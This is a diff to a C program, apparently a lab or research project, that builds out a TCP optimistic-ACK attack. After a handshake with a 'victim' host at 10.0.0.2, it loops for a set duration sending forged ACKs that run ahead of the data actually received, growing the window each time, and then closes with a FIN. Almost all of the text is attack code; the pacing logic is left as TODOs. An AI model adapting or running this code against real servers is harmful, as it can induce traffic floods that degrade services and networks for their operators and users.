@@ -3,6 +3,7 @@
 #include <errno.h>
 #include <string.h>
 #include <unistd.h>
+#include <time.h>
 
 //Socket stuff
 #include <sys/socket.h>
@@ -264,7 +265,7 @@ void handshake(struct victim_connection *m_victim, int sock) {
 
 }
 
-int beginAttack() {
+int beginAttack(int duration) {
 
     // local variables
     int sock;
@@ -282,31 +283,82 @@ int beginAttack() {
     m_victim.dst_addr = inet_addr("10.0.0.2");
     m_victim.dst_port = 5001;//TODO;
     m_victim.window = MSS;
+    m_victim.had_overrun = 0;
+    m_victim.overrun_ack = 0;
+    m_victim.is_done = 0;
 
     // Connect to each server using 3-way handshake
     handshake(&m_victim, sock);
 
-    // Get the first ack for each connection
-    
-
+    // Get the start ack for each connection
+    unsigned read_seq = read_packet(&m_victim, sock);
+    m_victim.start_ack = m_victim.last_sent_ack = read_seq;
 
     // Begin the pace thread to observe overruns
+    // TODO
 
+    time_t start_time;
+    time(&start_time);
 
+    time_t current_time;
+    time(&current_time);
     // begin the real attack
 
-    // Go through each connection and send the next ack
+    while (current_time - start_time <= duration) {
+      // See if the attack should stop
 
-    // for each connection increment the ack by the window size
+      if (m_victim.had_overrun) {
+        m_victim.last_sent_ack = m_victim.overrun_ack;
+        m_victim.had_overrun = 0;
+      }
 
-    // increase the window size by mss as long as its less than the max
+      // Go through each connection and send the next ack
 
-    // Cleanup
+      send_packet(sock,                       // socket
+                  &m_victim,                  // connection
+                  m_victim.send_seq,          // sequence number
+                  m_victim.last_sent_ack,     // ack number
+                  "",                         // content
+                  0,                          // content length
+                  0,                          // syn
+                  0,                          // fin
+                  0,                          // rst
+                  1,                          // is_ack
+                  5840,                       // window
+                  0);                         // w_scale
 
+      // for each connection increment the ack by the window size
+      m_victim.last_sent_ack += m_victim.window;
 
-    send_packet(sock,&m_victim,m_victim.send_seq,-1,
-      "",0,0,1,0,0,
-      5840,0);
+      // TODO go to sleep for the right amount of time
+      sleep(1);   // This is temporary
+
+      // increase the window size by mss as long as its less than the max
+      if (m_victim.window < maxwindow) {
+          m_victim.window += MSS;
+      }
+
+      /*
+      if (curr_rate < target_rate) {
+          curr_rate += target_rate / 100;
+      }
+      */
+      time(&current_time);
+    }
+    // Cleanup send the fin packet since we cannot call RST
+
+    send_packet(sock,                         // socket
+                &m_victim,                    // connection
+                m_victim.send_seq,            // sequence number
+                0,                            // ack number
+                "",                           // content
+                0,                            // content length
+                0,                            // syn
+                1,                            // fin
+                0,                            // rst
+                0,                            // is_ack
+                5840,                         // window
+                0);                           // w_scale
 
     close(sock);
 }
@@ -315,7 +367,7 @@ int beginAttack() {
 
 int main(int argc, char const *argv[]) {
   printf("In Main: About to begin:");
-  beginAttack();
+  beginAttack(30);
 
   return 0;
 }
